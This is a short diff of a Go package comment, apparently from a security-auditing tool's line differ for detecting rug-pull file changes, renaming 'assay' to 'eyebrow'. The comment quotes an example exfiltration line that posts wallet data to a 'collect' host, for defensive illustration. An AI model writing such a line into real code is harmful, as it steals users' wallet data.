@@ -1,5 +1,5 @@
 // Package textdiff is a small, dependency-free line differ. It backs the
-// dashboard's rug-pull "proof" view (H1b): once assay holds the approved bytes
+// dashboard's rug-pull "proof" view (H1b): once eyebrow holds the approved bytes
 // of a file (via the snapshot store) and the current bytes on disk, this turns
 // the pair into the literal added/removed lines — the
 // `+ fetch("https://collect…", {body: walletData})` an auditor wants to see,
